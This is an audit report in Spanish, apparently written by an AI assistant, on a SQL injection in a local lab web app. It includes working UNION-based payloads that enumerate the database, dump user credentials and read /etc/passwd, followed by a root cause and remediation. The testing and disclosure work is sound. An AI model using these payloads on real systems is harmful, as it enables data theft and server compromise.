# Informe de Auditoría de Seguridad – SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-21T07:45:52Z  
**Analista:** GitHub Copilot (claude-sonnet-4.6)  
**Clasificación:** CRÍTICA

---

## 1. Resumen Ejecutivo

Se detectó y explotó con éxito una vulnerabilidad de **SQL Injection clásica (error-based + UNION-based)** en el parámetro `id` de la aplicación web. La vulnerabilidad permite a un atacante extraer toda la información de la base de datos, leer archivos del sistema operativo y potencialmente comprometer el servidor por completo.

---

## 2. Descripción de la Vulnerabilidad

| Campo | Detalle |
|---|---|
| **Tipo** | SQL Injection (Error-based + UNION-based) |
| **Severidad** | Crítica (CVSS 10.0) |
| **Parámetro vulnerable** | `id` (GET) |
| **URL** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **Base de datos** | MariaDB 10.11.14 |
| **Usuario DB** | `root@172.18.0.3` (privilegios máximos) |
| **Fichero vulnerable** | `/var/www/html/low.php` |

---

## 3. Prueba de Concepto (PoC)

### 3.1 Detección del error SQL
```
GET /?id=1'&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```
**Respuesta:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

### 3.2 Determinación del número de columnas
- `ORDER BY 2-- -` → éxito (2 columnas confirmadas)
- `ORDER BY 3-- -` → error: *Unknown column '3' in 'ORDER BY'*

### 3.3 Extracción de información de la base de datos

#### Versión y base de datos actual:
```sql
-1' UNION SELECT version(),database()-- -
```
**Resultado:** `10.11.14-MariaDB-ubu2204` / `sqli_demo`

#### Bases de datos disponibles:
```sql
-1' UNION SELECT group_concat(schema_name),2 FROM information_schema.schemata-- -
```
**Resultado:** `information_schema, sqli_demo, sys, mysql, performance_schema`

#### Tablas en `sqli_demo`:
```sql
-1' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema='sqli_demo'-- -
```
**Resultado:** `users`

#### Columnas de la tabla `users`:
```sql
-1' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -
```
**Resultado:** `user_id, first_name, last_name, username, password, email`

### 3.4 Volcado de credenciales (tabla `users`)
```sql
-1' UNION SELECT group_concat(user_id,'|',first_name,'|',last_name,'|',username,'|',password,'|',email SEPARATOR '\n'),2 FROM sqli_demo.users-- -
```

| user_id | first_name | last_name | username | password | email |
|---|---|---|---|---|---|
| 1 | John | Doe | admin | password123 | admin@example.com |
| 8 | Frank | Wilson | fwilson | admin123 | frank@example.com |

### 3.5 Lectura de ficheros del sistema
El usuario de base de datos es `root` y `secure_file_priv` no tiene restricciones, permitiendo leer ficheros del sistema operativo:

```sql
-1' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -
```
**Resultado:** Contenido de `/etc/passwd` obtenido correctamente (lectura de ficheros confirmada).

---

## 4. Impacto

1. **Confidencialidad:** Exposición total de credenciales de usuarios (incluyendo contraseñas en texto plano).
2. **Integridad:** Posibilidad de modificar/eliminar datos en la base de datos.
3. **Disponibilidad:** Posibilidad de eliminar bases de datos o tablas.
4. **Sistema operativo:** Lectura de ficheros arbitrarios del servidor (`LOAD_FILE`).
5. **Escalada potencial:** Con `INTO OUTFILE` se podría escribir una webshell PHP en el servidor.

---

## 5. Causa Raíz

La aplicación construye la consulta SQL concatenando directamente el valor del parámetro `id` sin sanitización ni uso de consultas preparadas (*prepared statements*):

```php
// Código vulnerable (low.php)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($db, $query);
```

---

## 6. Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $db->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que `id` sea un entero antes de usarlo.

3. **Principio de mínimo privilegio:** El usuario de base de datos no debería ser `root`; debe tener solo permisos `SELECT` sobre las tablas necesarias.

4. **Deshabilitar `LOAD_FILE`:** Configurar `secure_file_priv` para restringir lectura/escritura de ficheros.

5. **No exponer errores SQL:** Deshabilitar la visualización de errores en producción (`display_errors = Off`).

6. **WAF:** Implementar un Web Application Firewall para detectar y bloquear payloads de SQLi.

7. **Almacenar contraseñas con hash:** Las contraseñas no deben almacenarse en texto plano; usar bcrypt o Argon2.

---

## 7. Conclusión

La aplicación en `http://web.dev.local:8083` presenta una vulnerabilidad **crítica de SQL Injection** que ha sido explotada con éxito para obtener:
- Versión del servidor de base de datos y nombre de la BD
- Listado completo de bases de datos, tablas y columnas
- Volcado de credenciales de todos los usuarios
- Lectura de ficheros del sistema operativo

Se recomienda **corrección inmediata** antes de exponer la aplicación en entornos de producción.
